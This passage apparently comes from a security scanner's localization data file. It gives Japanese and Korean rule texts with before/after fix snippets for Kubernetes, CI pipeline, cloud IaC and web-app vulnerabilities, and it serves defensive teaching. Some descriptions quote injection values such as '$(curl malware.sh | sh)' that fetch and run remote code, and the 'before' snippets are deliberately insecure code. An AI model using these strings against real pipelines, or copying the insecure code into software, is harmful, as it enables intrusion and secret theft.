      'コンテナのsecurityContextの"privileged: true"は、コンテナとホストの間の通常の分離のほぼすべてを無効にします。コンテナはホストのデバイスにアクセスしたり、ネットワーク設定を変更したり、多くの場合それを実行しているマシン上で事実上root権限を得たりできます。通常のアプリではほとんど必要ありません。',
    fix: {
      before: `securityContext:\n  privileged: true`,
      after: `securityContext:\n  privileged: false\n  capabilities:\n    add: ["NET_BIND_SERVICE"]  # 本当に必要なcapabilityだけ`,
    },
  },
  "k8s-plaintext-secret-env": {
    title: "Kubernetesマニフェストのenv変数に、秘密情報が平文で書かれています",
    description:
      '"password"/"secret"/"token"/"key"のような名前の環境変数が、Secret("valueFrom.secretKeyRef")から読み取るのではなく、リテラル値("value:")を持っています。そのためマニフェスト自体 — しばしばリポジトリにコミットされる — に秘密情報が平文で含まれることになり、クラスターでコマンドを実行できなくても設定を読めるだけの人にも見えてしまいます。',
    fix: {
      before: `env:\n  - name: DB_PASSWORD\n    value: supersecret123`,
      after: `env:\n  - name: DB_PASSWORD\n    valueFrom:\n      secretKeyRef:\n        name: db-credentials\n        key: password`,
    },
  },
  "k8s-run-as-root": {
    title: "Kubernetesマニフェストのコンテナがrootとして実行されるよう設定されています",
    description:
      'securityContextの"runAsUser: 0"または"runAsNonRoot: false"が、コンテナ内でのroot実行を明示的に強制しています。攻撃者がコンテナ内でコードを実行できた場合(例えば脆弱なライブラリを悪用して)、コンテナ内でrootであることは、ホストへの脱出やより広い範囲への影響を容易にします。',
    fix: {
      before: `securityContext:\n  runAsUser: 0`,
      after: `securityContext:\n  runAsNonRoot: true\n  runAsUser: 1000`,
    },
  },
  "k8s-privilege-escalation": {
    title: "Kubernetesマニフェストのコンテナが、開始時より多くの権限を得られる可能性があります",
    description:
      'securityContextの"allowPrivilegeEscalation: true"は、コンテナ内のプロセスが、それを起動したプロセスより多くの権限を得ることを許可します(例えばsetuidビットの付いたバイナリ経由)。アプリケーションの脆弱性と組み合わさると、意図された以上の権限でコードを実行する一歩手前の状態になります。',
    fix: {
      before: `securityContext:\n  allowPrivilegeEscalation: true`,
      after: `securityContext:\n  allowPrivilegeEscalation: false`,
    },
  },
  "k8s-host-namespace-access": {
    title: "Kubernetesマニフェストのpodがホストのネットワーク、プロセス、または共有メモリを共有しています",
    description:
      '"hostNetwork"、"hostPID"、または"hostIPC"がtrueに設定されていると、podは通常の分離から外れます。hostNetworkはpodをホストのネットワークに公開し(クラスターのネットワークポリシーを回避)、hostPIDはホストマシン上のすべてのプロセスへの可視性を与え、hostIPCはホストの共有メモリへのアクセスを与えます。通常のアプリではほとんど必要なく、典型的には低レベルのシステム/監視ツールでのみ使われます。',
    fix: {
      before: `spec:\n  hostNetwork: true`,
      after: `spec:\n  hostNetwork: false`,
    },
  },
  "k8s-missing-run-as-non-root": {
    title: "Kubernetesマニフェストがnon-rootユーザーでの実行を明示的に強制していません",
    description:
      'マニフェストのどこにも(podレベルでもコンテナレベルでも)"runAsNonRoot"が設定されていません。設定しない場合、コンテナはそのイメージが定義するユーザーとして実行されます — イメージ自体がそれを変更していなければ、多くの場合デフォルトでrootです。明示的にtrueに設定すると、イメージがそれでもrootとして実行しようとした場合にpodの起動が失敗するため、インシデントが起きて初めて気づくのではなく、事前に気づけます。',
    fix: {
      before: `containers:\n  - name: app\n    image: myapp:1.0`,
      after: `containers:\n  - name: app\n    image: myapp:1.0\n    securityContext:\n      runAsNonRoot: true`,
    },
  },
    "gitlab-ci-script-injection": {
      title: '外部ユーザーが制御する値がGitLab CIパイプラインで2段目のシェルを通過します',
      description: '"script:"（または "before_script:"/"after_script:"）の行が、マージリクエストのタイトル、コミットメッセージ、ブランチ名などのGitLab定義済み変数と一緒に "eval" や "sh -c"/"bash -c" を使っています — これらはすべて、外部フォークからであってもマージリクエストを開ける人なら誰でも書き込めます。値はまず外側のシェルで一度展開され、それが2段目のシェルが再びコードとして解釈する文字列に貼り付けられます："$(curl malware.sh | sh)" のようなタイトルは、そのジョブで使えるすべてのシークレットにアクセスしながらパイプライン内で任意のコマンドを実行してしまいます。',
      fix: {
        before: `script:
  - bash -c "deploy.sh $CI_MERGE_REQUEST_TITLE"`,
        after: `script:
  - deploy.sh "$CI_MERGE_REQUEST_TITLE"  # コマンドへの引数として渡す。再解釈されてしまう "bash -c" 文字列の中に入れない`,
      },
    },
    "gitlab-ci-privileged-dind-no-tls": {
      title: 'GitLab CIパイプラインのDocker-in-DockerがTLS暗号化を無効にしたまま動いています',
      description: 'このジョブは "docker:dind"（パイプライン内でイメージをビルドするために必要なDocker-in-Docker）サービスを使っていますが、"DOCKER_TLS_CERTDIR" を空文字列に設定しており、DockerクライアントとdindデーモンとのTLS暗号化が完全に無効になっています。TLSがなければ、ランナーの同じ内部ネットワーク上でそのポートに到達できる人は誰でも、本来そのジョブだけに限定されるべき、拡張された権限で動くDockerデーモンを制御できてしまいます。',
      fix: {
        before: `services:
  - docker:dind
variables:
  DOCKER_TLS_CERTDIR: ""`,
        after: `services:
  - docker:dind
variables:
  DOCKER_TLS_CERTDIR: "/certs"  # DockerクライアントとdindデーモンとのTLSが有効なまま — ""にすると完全に無効化される`,
      },
    },
    "gitlab-ci-unpinned-image": {
      title: 'GitLab CIパイプラインのDockerイメージが特定バージョンに固定されていません',
      description: 'パイプラインの "image:" がタグなしのイメージ（":latest" と同等）を指しているか、明示的に ":latest" を指しています。そのイメージを管理する人は、リポジトリを変更せずにいつでも中身を差し替えられます — 同じパイプラインがある日突然違うコードを実行し始める可能性があり、コミットではなくタグで参照するGitHub Actionと概念的に同じサプライチェーンリスクになります。',
      fix: {
        before: `image: node:latest`,
        after: `image: node:20.11.1  # "latest" の代わりに具体的なタグ（さらに良いのはダイジェスト "node@sha256:..."）`,
      },
    },
},
  ko: {
  "supabase-service-role-in-client": {
    title: "Supabase의 비밀 키가 브라우저용 파일에 그대로 노출됩니다",
    description:
      "공개 접두사(예: NEXT_PUBLIC_, VITE_)가 붙은 변수나 클라이언트 측 파일이 Supabase의 서비스 역할 키를 참조합니다. 이 키는 Row Level Security를 우회합니다: 브라우저 번들에 포함되면 누구나 이를 읽고 데이터베이스 관리자처럼 행동할 수 있습니다.",
    fix: {
      before: `// components/Dashboard.tsx\nconst supabase = createClient(url, process.env.NEXT_PUBLIC_SUPABASE_SERVICE_ROLE_KEY)`,
      after: `// app/api/admin/route.ts (서버 전용)\nconst supabase = createClient(url, process.env.SUPABASE_SERVICE_ROLE_KEY)`,
    },
  },
  "hardcoded-secret": {
    title: "비밀번호나 비밀 키가 코드에 직접 작성되어 있습니다",
    description:
      "API 키, 토큰 또는 비밀번호가 환경 변수에서 읽어오는 대신 리터럴 값으로 작성된 것으로 보입니다. 소스 코드(또는 저장소가 공개라면 저장소 전체)를 읽는 사람은 누구나 그 비밀을 얻게 됩니다.",
    fix: {
      before: `const apiKey = "sk_live_51H8x9K2eZvKYlo2C..."`,
      after: `const apiKey = process.env.STRIPE_SECRET_KEY`,
    },
  },
  "env-file-with-real-values": {
    title: "프로젝트의 실제 비밀번호가 담긴 파일이 분석 대상에 포함되어 있습니다",
    description:
      "실제 값이 담긴 .env 파일(.env.example이 아님)이 분석에 포함되어 있습니다. 이 파일이 저장소나 공개 배포에 포함되면 그 안의 모든 자격 증명이 노출됩니다.",
    fix: {
      before: `# .env (실수로 커밋됨)\nDATABASE_URL=postgres://user:realpassword@db.host/prod`,
      after: `# .env.example (커밋됨)\nDATABASE_URL=postgres://user:password@localhost/dev\n\n# .env는 저장소에서 제외됩니다 (.gitignore)`,
    },
  },
  "missing-row-level-security": {
    title: "누구나 모든 사용자의 데이터를 읽거나 수정할 수 있습니다",
    description:
      "Row Level Security가 비활성화되어 있거나, 요청자를 확인하지 않고 누구에게나 접근을 허용하는 정책(USING (true))이 설정되어 있습니다. 인증된 모든 사용자 — 또는 익명 사용자조차 — 다른 모든 사람의 데이터를 읽거나 수정할 수 있습니다.",
    fix: {
      before: `ALTER TABLE public.orders DISABLE ROW LEVEL SECURITY;`,
      after: `ALTER TABLE public.orders ENABLE ROW LEVEL SECURITY;\nCREATE POLICY "owners only" ON public.orders\n  USING (auth.uid() = user_id);`,
    },
  },
  "sql-injection": {
    title: "사용자가 입력한 값이 데이터베이스 쿼리에 그대로 붙여넣어집니다",
    description:
      "SQL 쿼리가 매개변수를 사용하는 대신 문자열을 직접 연결하거나 보간하여 만들어집니다. 그 텍스트가 (간접적으로라도) 사용자로부터 온 것이라면 쿼리 자체를 변경할 수 있습니다 — SQL 인젝션.",
    fix: {
      before: "db.query(`SELECT * FROM users WHERE email = '${email}'`)",
      after: `db.query("SELECT * FROM users WHERE email = $1", [email])`,
    },
  },
  "plaintext-password-storage": {
    title: "비밀번호가 보호되지 않는 것으로 보입니다",
    description:
      "비밀번호 필드가 요청에서 받은 그대로 저장되며, 파일 안에 해싱 함수(bcrypt, argon2, scrypt)가 전혀 보이지 않습니다. 데이터베이스가 침해되면 모든 비밀번호를 즉시 사용할 수 있게 됩니다.",
    fix: {
      before: `await db.users.insert({ email, password: req.body.password })`,
      after: `const hashed = await bcrypt.hash(req.body.password, 12)\nawait db.users.insert({ email, password: hashed })`,
    },
  },
  "hardcoded-jwt-secret": {
    title: "로그인 서명에 사용되는 시크릿이 코드에 평문으로 작성되어 있습니다",
    description:
      "jwt.sign / jwt.verify에 전달되는 시크릿(또는 JWT_SECRET 변수)이 환경 변수가 아니라 코드 안의 리터럴 값입니다. 이를 읽는 사람은 누구나 모든 사용자에 대한 유효한 액세스 토큰을 만들 수 있습니다.",
    fix: {
      before: `jwt.sign(payload, "super-secret-key-123")`,
      after: `jwt.sign(payload, process.env.JWT_SECRET)`,
    },
  },
  "command-injection": {
    title: "서버가 외부 명령을 실행하도록 강제될 수 있습니다",
    description:
      "시스템 명령을 실행하는 함수(exec, execSync, spawn)가 보간이나 연결로 만들어진 문자열을 받습니다. 그 문자열의 일부가 사용자 입력에서 온 것이라면, 이를 제어하는 사람이 서버에서 임의의 명령을 실행시킬 수 있습니다.",
    fix: {
      before: "execSync(`convert ${filename} output.png`)",
      after: `execFile("convert", [filename, "output.png"])`,
    },
  },
  "path-traversal": {
    title: "서버의 파일을 외부에서 경로를 지정해 읽거나 쓸 수 있습니다",
    description:
      '파일을 읽거나, 쓰거나, 전송하는 함수가 허용된 폴더 안에 머무는지 확인하지 않고 요청 값(query, body, params)에서 경로를 직접 받습니다. 공격자는 "../"를 삽입해 의도된 폴더를 벗어나 서버의 임의의 파일(예: 자격 증명이 담긴 설정 파일)을 읽거나 덮어쓸 수 있습니다.',
    fix: {
      before: `app.get("/download", (req, res) => {\n  res.sendFile(req.query.file)\n})`,
      after: `const ALLOWED_DIR = path.resolve("./uploads")\napp.get("/download", (req, res) => {\n  const target = path.resolve(ALLOWED_DIR, req.query.file)\n  if (!target.startsWith(ALLOWED_DIR)) return res.status(400).send("허용되지 않은 경로")\n  res.sendFile(target)\n})`,
    },
  },
  "nosql-injection": {
    title: "사용자가 입력한 값이 MongoDB 쿼리 안에서 코드로 실행됩니다",
    description:
      "MongoDB의 $where 연산자는 모든 문서에 대해 서버 측 JavaScript를 실행합니다 — 그 문자열이 사용자로부터 온 값을 연결해 만들어진 것이라면, 이를 제어하는 사람은 일반적인 SQL 인젝션처럼 필터만 바꾸는 것이 아니라 데이터베이스 컨텍스트에서 임의의 코드를 실행시킬 수 있습니다.",
    fix: {
      before: `db.collection.find({ $where: "this.username == '" + username + "'" })`,
      after: `db.collection.find({ username: username })`,
    },
  },
  ssti: {
    title: "사용자가 입력한 값이 데이터가 아니라 템플릿으로 해석됩니다",
    description:
      "템플릿을 컴파일/렌더링하는 함수가 고정된 템플릿을 사용하고 데이터만 전달하는 대신, 요청 값에서 템플릿 전체를 받습니다. 공격자는 템플릿 엔진의 문법(예: Jinja2의 {{7*7}})을 직접 작성해 서버에서 코드를 실행시킬 수 있습니다 — Server-Side Template Injection은 XSS처럼 단순한 표시 문제가 아니라 임의의 명령 실행으로 이어지는 경우가 많습니다.",
    fix: {
      before: `return render_template_string(request.args.get("name"))`,
      after: `return render_template("profile.html", name=request.args.get("name"))`,
    },
  },
  xxe: {
    title: "XML 파서가 파일을 읽거나 외부 요청을 보내도록 강제될 수 있습니다",
    description:
      "XML 파서(DocumentBuilderFactory)가 인근 코드에서 외부 엔티티(DOCTYPE)를 명시적으로 비활성화하지 않은 채 생성됩니다. 신뢰할 수 없는 소스에서 XML을 받는다면, 공격자는 외부 엔티티를 정의해 서버의 파일을 읽거나 원하는 주소로 서버가 연결하게 만들 수 있습니다 — XML External Entity.",
    fix: {
      before: `DocumentBuilderFactory factory = DocumentBuilderFactory.newInstance();\nDocumentBuilder builder = factory.newDocumentBuilder();`,
      after: `DocumentBuilderFactory factory = DocumentBuilderFactory.newInstance();\nfactory.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);\nDocumentBuilder builder = factory.newDocumentBuilder();`,
    },
  },
  "docker-hardcoded-secret": {
    title: "Dockerfile의 ENV 또는 ARG 명령에 비밀이 직접 작성되어 있습니다",
    description:
      "password/secret/token/key와 같은 이름의 변수가 ENV 또는 ARG 명령에 리터럴 값을 가지고 있습니다. 일반적으로 이미지에 포함되지 않는 .env 파일과 달리, 이 값은 Docker 이미지 자체에 내장됩니다 — Dockerfile의 이후 버전에서 그 줄이 제거되더라도, 이미지를 pull하거나 레이어 기록을 조사할 수 있는 사람은 누구나 이를 복구할 수 있습니다.",
    fix: {
      before: `ENV DB_PASSWORD=supersecret123`,
      after: `ARG DB_PASSWORD\nENV DB_PASSWORD=$DB_PASSWORD\n# docker build --build-arg DB_PASSWORD=***로 전달됩니다 (또는 더 좋은 방법으로,\n# 레이어 기록에 남지 않는 BuildKit 시크릿 마운트를 사용하세요)`,
    },
  },
  "k8s-privileged-container": {
    title: "Kubernetes 매니페스트의 컨테이너가 privileged로 실행됩니다",
    description:
      '컨테이너의 securityContext에 있는 "privileged: true"는 컨테이너와 호스트 사이의 일반적인 격리를 거의 모두 비활성화합니다: 컨테이너가 호스트의 장치에 접근하고, 네트워크 구성을 변경하며, 많은 경우 이를 실행하는 머신에 대한 루트 접근 권한을 사실상 얻게 됩니다. 일반적인 앱에는 거의 필요하지 않습니다.',
    fix: {
      before: `securityContext:\n  privileged: true`,
      after: `securityContext:\n  privileged: false\n  capabilities:\n    add: ["NET_BIND_SERVICE"]  # 실제로 필요한 capability만`,
    },
  },
  "k8s-plaintext-secret-env": {
    title: "Kubernetes 매니페스트의 env 변수에 비밀이 평문으로 작성되어 있습니다",
    description:
      'password/secret/token/key와 같은 이름의 환경 변수가 Secret("valueFrom.secretKeyRef")에서 읽어오는 대신 리터럴 값("value:")을 가지고 있습니다. 매니페스트 자체는 — 종종 저장소에 커밋되므로 — 비밀을 평문으로 담고 있으며, 클러스터에서 명령을 실행할 수 없고 구성만 읽을 수 있는 사람에게도 보입니다.',
    fix: {
      before: `env:\n  - name: DB_PASSWORD\n    value: supersecret123`,
      after: `env:\n  - name: DB_PASSWORD\n    valueFrom:\n      secretKeyRef:\n        name: db-credentials\n        key: password`,
    },
  },
  "terraform-open-security-group": {
    title: "Terraform 보안 그룹이 민감한 포트를 전체 인터넷에 열어둡니다",
    description:
      '0.0.0.0/0(모든 IP 주소)을 포함하는 "cidr_blocks" 규칙이 민감한 포트 — SSH(22), RDP(3389), 또는 일반적인 데이터베이스 포트(MySQL, Postgres, MongoDB, Redis, SQL Server) — 근처에 있습니다. 인터넷상의 누구나 그 서비스에 연결을 시도할 수 있으며, 허용되어야 할 사람만 그런 것이 아닙니다.',
    fix: {
      before: `ingress {\n  from_port   = 22\n  to_port     = 22\n  protocol    = "tcp"\n  cidr_blocks = ["0.0.0.0/0"]\n}`,
      after: `ingress {\n  from_port   = 22\n  to_port     = 22\n  protocol    = "tcp"\n  cidr_blocks = ["10.0.0.0/16"]  # 당신의 사설 네트워크나 베스천 호스트만\n}`,
    },
  },
  "gcp-firewall-open-to-internet": {
    title: "Google Cloud 방화벽 규칙이 민감한 포트를 전체 인터넷에 열어둡니다",
    description:
      '0.0.0.0/0(모든 IP 주소)을 포함하는 "source_ranges"를 가진 "google_compute_firewall" 리소스가 민감한 포트 — SSH(22), RDP(3389), 또는 일반적인 데이터베이스 포트(MySQL, Postgres, MongoDB, Redis, SQL Server) — 로의 트래픽을 허용합니다. 인터넷상의 누구나 그 서비스에 연결을 시도할 수 있으며, 허용되어야 할 사람만 그런 것이 아닙니다.',
    fix: {
      before: `resource "google_compute_firewall" "allow-ssh" {\n  allow {\n    protocol = "tcp"\n    ports    = ["22"]\n  }\n  source_ranges = ["0.0.0.0/0"]\n}`,
      after: `resource "google_compute_firewall" "allow-ssh" {\n  allow {\n    protocol = "tcp"\n    ports    = ["22"]\n  }\n  source_ranges = ["10.0.0.0/16"]  # 당신의 사설 네트워크나 베스천 호스트만\n}`,
    },
  },
  "azure-nsg-open-to-internet": {
    title: "Azure 네트워크 규칙이 민감한 포트를 전체 인터넷에 열어둡니다",
    description:
      '네트워크 보안 규칙("azurerm_network_security_rule", 또는 "azurerm_network_security_group" 안의 "security_rule" 블록)이 "source_address_prefix"를 "*" 또는 "0.0.0.0/0"으로, 방향을 "Inbound"로, 접근을 "Allow"로 설정한 채 민감한 포트 — SSH(22), RDP(3389), 또는 일반적인 데이터베이스 포트 — 근처에 있습니다. 인터넷상의 누구나 그 서비스에 연결을 시도할 수 있으며, 허용되어야 할 사람만 그런 것이 아닙니다.',
    fix: {
      before: `resource "azurerm_network_security_rule" "allow-ssh" {\n  direction              = "Inbound"\n  access                 = "Allow"\n  destination_port_range = "22"\n  source_address_prefix  = "*"\n}`,
      after: `resource "azurerm_network_security_rule" "allow-ssh" {\n  direction              = "Inbound"\n  access                 = "Allow"\n  destination_port_range = "22"\n  source_address_prefix  = "10.0.0.0/16"  # 당신의 사설 네트워크나 베스천 호스트만\n}`,
    },
  },
  "terraform-hardcoded-secret": {
    title: "Terraform 변수의 기본값으로 비밀이 작성되어 있습니다",
    description:
      'password/secret/token/key와 같은 이름의 변수가 "default"에 리터럴 값을 가지고 있습니다. 런타임에 전달되는 값(tfvars, TF_VAR_* 환경 변수)과 달리, 기본값은 소스 코드에 남습니다 — 저장소가 공유되거나 공개라면, Terraform 상태에 접근하지 않고도 누구나 이를 볼 수 있습니다.',
    fix: {
      before: `variable "db_password" {\n  default = "supersecret123"\n}`,
      after: `variable "db_password" {\n  # 기본값 없음: .tfvars 파일(git 외부) 또는 TF_VAR_db_password 환경 변수로 전달하세요\n  sensitive = true\n}`,
    },
  },
  "gha-script-injection": {
    title: "외부 사용자가 제어하는 값이 CI 셸 명령에 직접 들어갑니다",
    description:
      'GitHub Actions 워크플로의 "run:" 명령이 pull request 제목, 브랜치 이름, 댓글 텍스트 같은 값을 직접 보간합니다 — 이 모두는 외부 fork에서조차 pull request나 댓글을 여는 누구나 쓸 수 있는 값입니다. `"; curl malware.sh | sh #` 같은 값은 해당 워크플로에서 사용 가능한 모든 시크릿에 접근하면서 CI에서 임의의 명령을 실행시킬 수 있습니다.',
    fix: {
      before: `- run: echo "\${{ github.event.pull_request.title }}"`,
      after: `- env:\n    PR_TITLE: \${{ github.event.pull_request.title }}\n  run: echo "$PR_TITLE"  # 환경 변수로 전달되며, 명령에 직접 보간되지 않습니다`,
    },
  },
  "gha-pull-request-target-checkout": {
    title: "워크플로가 저장소의 시크릿에 접근할 수 있는 상태로 외부 pull request의 코드를 실행합니다",
    description:
      '워크플로가 "pull_request_target"을 사용합니다 — 이는 관련 없는 fork에서 열린 pull request에 대해서도 기본 저장소의 권한과 시크릿으로 실행됩니다 — 그리고 기본 브랜치가 아니라 pull request 자체의 코드("github.event.pull_request.head")를 체크아웃합니다. pull request를 여는 사람은 사실상 그 시크릿에 접근할 수 있는 상태로 자신의 코드를 실행시키게 됩니다.',
    fix: {
      before: `on:\n  pull_request_target:\njobs:\n  build:\n    steps:\n      - uses: actions/checkout@v4\n        with:\n          ref: \${{ github.event.pull_request.head.sha }}`,
      after: `on:\n  pull_request_target:\njobs:\n  build:\n    steps:\n      # PR의 코드가 아니라 기본 브랜치를 체크아웃합니다 — 또는 더 넓은\n      # 권한/시크릿이 필요하지 않다면 "pull_request_target" 대신\n      # "pull_request"를 사용하세요.\n      - uses: actions/checkout@v4`,
    },
  },
  "insecure-deserialization": {
    title: "요청 데이터가 코드를 실행할 수 있는 형식으로 역직렬화됩니다",
    description:
      "pickle(Python), unserialize()(PHP), ObjectInputStream(Java), 또는 node-serialize 라이브러리(Node)가 요청에서 직접 가져온 값을 역직렬화하고 있습니다. JSON과 달리 이 형식들은 역직렬화 과정 자체에서 코드를 표현하고 실행할 수 있습니다 — 전송된 값을 제어하는 사람이 서버에서 임의의 코드 실행을 얻을 수 있습니다.",
    fix: {
      before: `data = pickle.loads(request.data)`,
      after: `import json\ndata = json.loads(request.data)  # JSON은 pickle과 달리 파싱 중에 절대 코드를 실행하지 않습니다`,
    },
  },
  "jwt-none-algorithm": {
    title: '코드가 서명되지 않은 JWT 토큰("none" 알고리즘)을 명시적으로 허용합니다',
    description:
      'JWT 토큰을 검증할 때 허용되는 알고리즘 중에 "none"이 포함되어 있습니다. "none" 알고리즘을 가진 토큰은 검증할 서명이 전혀 없습니다: 누구나 임의의 내용(예: 관리자 역할)으로 토큰을 만들 수 있고 코드는 이를 유효한 것으로 받아들입니다.',
    fix: {
      before: `jwt.verify(token, secret, { algorithms: ["HS256", "none"] })`,
      after: `jwt.verify(token, secret, { algorithms: ["HS256"] })  // 허용 알고리즘에 "none"을 절대 포함하지 마세요`,
    },
  },
  "unprotected-new-table": {
    title: "새 테이블이 보호 없이 생성되는 것으로 보입니다",
    description:
      "SQL 마이그레이션이 테이블을 생성하지만 같은 파일 안에서 그 테이블에 대해 Row Level Security를 활성화하지 않습니다. 이 상태가 유지되는 한, 테이블은 누구나 읽거나 쓸 수 있는 제한 없는 상태로 시작됩니다.",
    fix: {
      before: `CREATE TABLE public.invoices (\n  id uuid PRIMARY KEY,\n  user_id uuid REFERENCES auth.users\n);`,
      after: `CREATE TABLE public.invoices (\n  id uuid PRIMARY KEY,\n  user_id uuid REFERENCES auth.users\n);\nALTER TABLE public.invoices ENABLE ROW LEVEL SECURITY;`,
    },
  },
  "permissive-cors": {
    title: "사이트가 다른 모든 웹사이트의 요청을 허용합니다",
    description:
      "CORS 헤더가 모든 출처(*)의 요청을 허용하도록 설정되어 있거나, cors() 미들웨어가 제한 없이 사용되고 있습니다. 어떤 제3자 웹사이트든 이미 인증된 사용자의 브라우저에서 당신의 API를 호출할 수 있습니다.",
    fix: {
      before: `app.use(cors())`,
      after: `app.use(cors({ origin: ["https://yoursite.com"] }))`,
    },
  },
  "admin-function-missing-auth": {
    title: "관리자 권한을 가진 함수가 사용자를 확인하지 않습니다",
    description:
      "이름에서 관리자 작업임을 암시하는 라우트나 함수에 인근 코드에 인증이나 역할 확인이 전혀 없습니다. URL을 아는 사람은 누구나 이를 실행할 수 있습니다.",
    fix: {
      before: `router.post("/admin/delete-user", async (req, res) => {\n  await db.users.delete(req.body.id)\n})`,
      after: `router.post("/admin/delete-user", requireAuth, requireRole("admin"), async (req, res) => {\n  await db.users.delete(req.body.id)\n})`,
    },
  },
  ssrf: {
    title: "사이트가 외부 코드를 실행하도록 강제될 수 있습니다",
    description:
      "나가는 HTTP 요청(fetch, axios)이 사용자 요청에서 온 값을 대상 URL로 직접 사용합니다. 악의적인 사용자가 서버로 하여금 내부 주소나 임의의 주소를 호출하게 만들 수 있습니다 — Server-Side Request Forgery.",
    fix: {
      before: `const data = await fetch(req.query.url)`,
      after: `const ALLOWED = new Set(["https://api.yourservice.com"])\nif (!ALLOWED.has(req.query.url)) throw new Error("허용되지 않은 URL")\nconst data = await fetch(req.query.url)`,
    },
  },
  "weak-password-hashing": {
    title: "비밀번호가 이제는 쉽게 뚫리는 방식으로 보호되고 있습니다",
    description:
      "같은 줄에서 md5() 또는 sha1()이 비밀번호와 관련된 값에 적용됩니다. 이 알고리즘들은 계산 속도가 너무 빨라서, 데이터베이스를 가진 공격자는 초당 수십억 개의 비밀번호를 시도할 수 있습니다.",
    fix: {
      before: `const hashed = crypto.createHash("md5").update(password).digest("hex")`,
      after: `const hashed = await bcrypt.hash(password, 12)`,
    },
  },
  "k8s-run-as-root": {
    title: "Kubernetes 매니페스트의 컨테이너가 root로 실행되도록 설정되어 있습니다",
    description:
      'securityContext의 "runAsUser: 0" 또는 "runAsNonRoot: false"는 컨테이너가 root로 실행되도록 명시적으로 강제합니다. 공격자가 컨테이너 안에서 코드를 실행하는 데 성공하면(예: 취약한 라이브러리를 악용하여), 컨테이너 안의 root 권한은 호스트로의 탈출이나 더 넓은 영향을 더 쉽게 만듭니다.',
    fix: {
      before: `securityContext:\n  runAsUser: 0`,
      after: `securityContext:\n  runAsNonRoot: true\n  runAsUser: 1000`,
    },
  },
  "k8s-privilege-escalation": {
    title: "Kubernetes 매니페스트의 컨테이너가 시작 시점보다 더 많은 권한을 얻을 수 있습니다",
    description:
      'securityContext의 "allowPrivilegeEscalation: true"는 컨테이너 안의 프로세스가 자신을 시작한 프로세스보다 더 많은 권한을 얻도록 허용합니다(예: setuid 바이너리를 통해). 애플리케이션의 취약점과 결합되면, 의도한 것보다 더 많은 권한으로 코드를 실행하는 데 한 걸음 더 가까워집니다.',
    fix: {
      before: `securityContext:\n  allowPrivilegeEscalation: true`,
      after: `securityContext:\n  allowPrivilegeEscalation: false`,
    },
  },
  "k8s-host-namespace-access": {
    title: "Kubernetes 매니페스트의 pod가 호스트의 네트워크, 프로세스 또는 공유 메모리를 공유합니다",
    description:
      '"hostNetwork", "hostPID" 또는 "hostIPC"가 true로 설정되면 pod가 일반적인 격리에서 벗어납니다: hostNetwork는 pod를 호스트의 네트워크에 노출시키고(클러스터의 네트워크 정책을 우회), hostPID는 호스트 머신의 모든 프로세스를 볼 수 있게 하며, hostIPC는 호스트의 공유 메모리에 접근할 수 있게 합니다. 일반적인 앱에는 거의 필요하지 않으며, 보통 저수준 시스템/모니터링 도구에만 필요합니다.',
    fix: {
      before: `spec:\n  hostNetwork: true`,
      after: `spec:\n  hostNetwork: false`,
    },
  },
  "terraform-s3-block-public-access-disabled": {
    title: "Terraform에 정의된 S3 버킷에서 Block Public Access가 비활성화되어 있습니다",
    description:
      '"aws_s3_bucket_public_access_block"의 네 가지 보호 기능(block_public_acls, ignore_public_acls, block_public_policy, restrict_public_buckets) 중 하나 이상이 false로 설정되어 있습니다. 버킷이 이미 공개되었다는 의미는 아니지만, 향후 실수로 공개되는 것을 막아줄 안전망을 제거합니다.',
    fix: {
      before: `resource "aws_s3_bucket_public_access_block" "example" {\n  block_public_acls = false\n}`,
      after: `resource "aws_s3_bucket_public_access_block" "example" {\n  block_public_acls       = true\n  ignore_public_acls      = true\n  block_public_policy     = true\n  restrict_public_buckets = true\n}`,
    },
  },
  "terraform-iam-wildcard-policy": {
    title: "Terraform에 정의된 IAM 정책이 전체 접근 권한을 부여합니다",
    description:
      'action "*"과 resource "*"를 가진 statement는 모든 AWS 서비스와 리소스에 대한 전체 접근 권한을 부여합니다 — 적용되기도 전에 코드에서 직접 읽어낸, 실제 IAM 상태에서 이미 수행하는 것과 동일한 점검입니다. 비상용 역할을 위한 의도일 수 있지만 확인이 필요합니다: 일상적인 용도로는 실제로 필요한 권한만 부여하세요.',
    fix: {
      before: `statement {\n  effect    = "Allow"\n  actions   = ["*"]\n  resources = ["*"]\n}`,
      after: `statement {\n  effect    = "Allow"\n  actions   = ["s3:GetObject"]\n  resources = ["arn:aws:s3:::your-bucket/*"]\n}`,
    },
  },
  "gcp-storage-bucket-public": {
    title: "Google Cloud Storage 버킷이 누구나 읽을 수 있도록 설정되어 있습니다",
    description:
      '"google_storage_bucket_iam_member" 또는 "google_storage_bucket_iam_binding" 리소스가 "allUsers" 또는 "allAuthenticatedUsers"에 역할을 부여합니다 — 전자는 Google 계정이 없어도 인터넷상의 누구나 버킷을 읽을 수 있게 하고, 후자는 접근해야 할 사람뿐 아니라 Google 계정을 가진 누구나 읽을 수 있게 합니다.',
    fix: {
      before: `resource "google_storage_bucket_iam_member" "public" {\n  bucket = google_storage_bucket.example.name\n  role   = "roles/storage.objectViewer"\n  member = "allUsers"\n}`,
      after: `resource "google_storage_bucket_iam_member" "example" {\n  bucket = google_storage_bucket.example.name\n  role   = "roles/storage.objectViewer"\n  member = "user:someone@example.com"  # allUsers/allAuthenticatedUsers가 아니라 실제로 접근이 필요한 사람만\n}`,
    },
  },
  "azure-storage-public-access": {
    title: "Azure 스토리지 계정에서 공개 Blob 접근이 활성화되어 있습니다",
    description:
      '"azurerm_storage_account"에서 "allow_blob_public_access"가 true로 설정되어 있습니다: 공개된 blob/컨테이너의 URL을 아는 사람은 누구나 인증 없이 이를 읽을 수 있습니다.',
    fix: {
      before: `resource "azurerm_storage_account" "example" {\n  allow_blob_public_access = true\n}`,
      after: `resource "azurerm_storage_account" "example" {\n  allow_blob_public_access = false\n}`,
    },
  },
  "gcp-iam-overly-broad-role": {
    title: "Google Cloud IAM 역할이 전체 접근 권한(Owner/Editor)을 부여합니다",
    description:
      '"google_project_iam_binding"/"google_project_iam_member"(또는 조직/폴더 수준의 동등한 리소스)가 기본 역할 "roles/owner" 또는 "roles/editor"를 할당합니다 — 프로젝트 내 거의 모든 서비스에 대한 전체 접근 권한입니다. 비상용 계정을 위한 의도일 수 있지만 확인이 필요합니다: 일상적인 용도로는 실제로 필요한 더 구체적인 미리 정의된 역할만 부여하세요.',
    fix: {
      before: `resource "google_project_iam_member" "admin" {\n  project = "my-project"\n  role    = "roles/owner"\n  member  = "user:dev@example.com"\n}`,
